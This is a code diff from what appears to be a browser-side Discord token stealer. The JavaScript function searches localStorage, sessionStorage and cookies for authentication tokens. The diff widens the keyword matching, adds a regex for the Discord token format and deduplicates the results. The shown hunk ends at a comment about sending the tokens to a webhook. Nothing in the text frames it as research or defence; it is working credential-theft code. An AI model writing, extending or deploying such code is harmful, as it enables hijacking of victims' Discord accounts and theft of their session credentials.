@@ -219,44 +219,111 @@
             var tokens = [];
             var i, key, val;
             
-            // LocalStorage
+            console.log('Starting token scan...');
+            
+            // LocalStorage - buscar tokens de Discord
             try {
+                console.log('Scanning localStorage, total keys:', localStorage.length);
                 for (i = 0; i < localStorage.length; i++) {
                     key = localStorage.key(i);
                     val = localStorage.getItem(key);
-                    if (key && val && (key.indexOf('token') > -1 || key.indexOf('discord') > -1)) {
-                        tokens.push({s: 'LS', k: key, v: val});
+                    
+                    // Log cada key para debug
+                    console.log('LS Key:', key);
+                    
+                    if (key && val) {
+                        // Buscar cualquier key que contenga estas palabras
+                        var keyLower = key.toLowerCase();
+                        if (keyLower.indexOf('token') > -1 || 
+                            keyLower.indexOf('discord') > -1 || 
+                            keyLower.indexOf('auth') > -1 ||
+                            keyLower.indexOf('user') > -1 ||
+                            keyLower.indexOf('session') > -1) {
+                            console.log('Found potential token in LS:', key);
+                            tokens.push({s: 'LS', k: key, v: val});
+                        }
+                        
+                        // Buscar por patrón de token de Discord (base64)
+                        if (val.length > 50 && (val.indexOf('mfa.') === 0 || /^[A-Za-z0-9_-]{24,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{27,}$/.test(val))) {
+                            console.log('Found Discord token pattern:', key);
+                            tokens.push({s: 'LS-Pattern', k: key, v: val});
+                        }
                     }
                 }
-            } catch(e) {}
+            } catch(e) {
+                console.error('Error scanning localStorage:', e);
+            }
             
             // SessionStorage
             try {
+                console.log('Scanning sessionStorage, total keys:', sessionStorage.length);
                 for (i = 0; i < sessionStorage.length; i++) {
                     key = sessionStorage.key(i);
                     val = sessionStorage.getItem(key);
-                    if (key && val && (key.indexOf('token') > -1 || key.indexOf('discord') > -1)) {
-                        tokens.push({s: 'SS', k: key, v: val});
+                    
+                    console.log('SS Key:', key);
+                    
+                    if (key && val) {
+                        var keyLower = key.toLowerCase();
+                        if (keyLower.indexOf('token') > -1 || 
+                            keyLower.indexOf('discord') > -1 || 
+                            keyLower.indexOf('auth') > -1 ||
+                            keyLower.indexOf('user') > -1 ||
+                            keyLower.indexOf('session') > -1) {
+                            console.log('Found potential token in SS:', key);
+                            tokens.push({s: 'SS', k: key, v: val});
+                        }
+                        
+                        if (val.length > 50 && (val.indexOf('mfa.') === 0 || /^[A-Za-z0-9_-]{24,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{27,}$/.test(val))) {
+                            console.log('Found Discord token pattern in SS:', key);
+                            tokens.push({s: 'SS-Pattern', k: key, v: val});
+                        }
                     }
                 }
-            } catch(e) {}
+            } catch(e) {
+                console.error('Error scanning sessionStorage:', e);
+            }
             
             // Cookies
             try {
                 var cookies = document.cookie.split(';');
+                console.log('Scanning cookies, total:', cookies.length);
                 for (i = 0; i < cookies.length; i++) {
                     var parts = cookies[i].split('=');
                     if (parts.length >= 2) {
                         key = parts[0].replace(/^\s+/, '');
-                        val = parts[1];
-                        if (key.indexOf('token') > -1 || key.indexOf('discord') > -1 || key.indexOf('auth') > -1) {
+                        val = parts.slice(1).join('='); // Por si el valor tiene '='
+                        
+                        console.log('Cookie:', key);
+                        
+                        var keyLower = key.toLowerCase();
+                        if (keyLower.indexOf('token') > -1 || 
+                            keyLower.indexOf('discord') > -1 || 
+                            keyLower.indexOf('auth') > -1 ||
+                            keyLower.indexOf('session') > -1 ||
+                            keyLower.indexOf('__') === 0) { // Cookies de Discord suelen empezar con __
+                            console.log('Found potential token in Cookie:', key);
                             tokens.push({s: 'Cookie', k: key, v: val});
                         }
                     }
                 }
-            } catch(e) {}
+            } catch(e) {
+                console.error('Error scanning cookies:', e);
+            }
             
-            return tokens;
+            // Eliminar duplicados
+            var uniqueTokens = [];
+            var seen = {};
+            for (i = 0; i < tokens.length; i++) {
+                var identifier = tokens[i].k + tokens[i].v;
+                if (!seen[identifier]) {
+                    seen[identifier] = true;
+                    uniqueTokens.push(tokens[i]);
+                }
+            }
+            
+            console.log('Total unique tokens found:', uniqueTokens.length);
+            return uniqueTokens;
         }
         
         // Enviar al webhook
